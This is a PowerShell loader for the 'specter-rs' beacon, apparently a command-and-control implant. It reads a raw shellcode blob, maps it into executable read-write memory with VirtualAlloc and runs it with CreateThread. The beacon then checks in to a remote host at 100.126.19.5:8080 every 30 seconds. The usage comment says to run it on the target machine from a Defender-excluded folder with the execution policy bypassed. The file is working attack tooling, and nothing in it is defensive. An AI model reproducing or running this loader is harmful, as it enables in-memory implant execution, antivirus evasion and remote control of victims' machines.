# specter-rs demo loader (PowerShell) — run the raw PIC blob on Windows.
#
# The beacon artifact is a raw position-independent .text blob (not a PE):
# SptEntry is its FIRST byte and never returns. The loader copies the blob
# into RWX memory and starts it as a thread (LPTHREAD_START_ROUTINE gets an
# ignored argument in RCX; the entry stub adjusts the stack itself).
#
# Usage (from the target machine, inside the Defender-excluded folder):
#   powershell -ExecutionPolicy Bypass -File run_blob.ps1 -Blob .\specter-demo.bin
#
# The beacon writes its debug log (specter.log) into the CURRENT directory —
# run it from the folder where you want the log.

param(
    [Parameter(Mandatory = $true)]
    [string]$Blob
)

$ErrorActionPreference = "Stop"

$native = @"
using System;
using System.Runtime.InteropServices;
public static class SptLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@
Add-Type -TypeDefinition $native

$data = [System.IO.File]::ReadAllBytes($Blob)
Write-Host ("[+] blob: {0} bytes ({1:X8} entry)" -f $data.Length, [BitConverter]::ToUInt32($data, 0))

# MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
$base = [SptLoader]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]([uint64]($data.Length + 0x1000)), 0x3000, 0x40)
if ($base -eq [IntPtr]::Zero) {
    throw ("VirtualAlloc failed (error {0})" -f [Runtime.InteropServices.Marshal]::GetLastWin32Error())
}
Write-Host ("[+] mapped at 0x{0:X}" -f $base.ToInt64())

[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $base, $data.Length)

# The entry thread. The beacon loops forever (sleep cycles); the wait just
# keeps this PowerShell window alive so it visibly never exits.
$tid = [uint32]0
$thread = [SptLoader]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $base, [IntPtr]::Zero, 0, [ref]$tid)
if ($thread -eq [IntPtr]::Zero) {
    throw ("CreateThread failed (error {0})" -f [Runtime.InteropServices.Marshal]::GetLastWin32Error())
}
Write-Host ("[+] beacon thread {0} running — check-in target 100.126.19.5:8080" -f $tid)
Write-Host "[+] waiting (Ctrl+C to stop); the beacon sleeps 30s between check-ins"

[SptLoader]::WaitForSingleObject($thread, [uint32]0xFFFFFFFF) | Out-Null
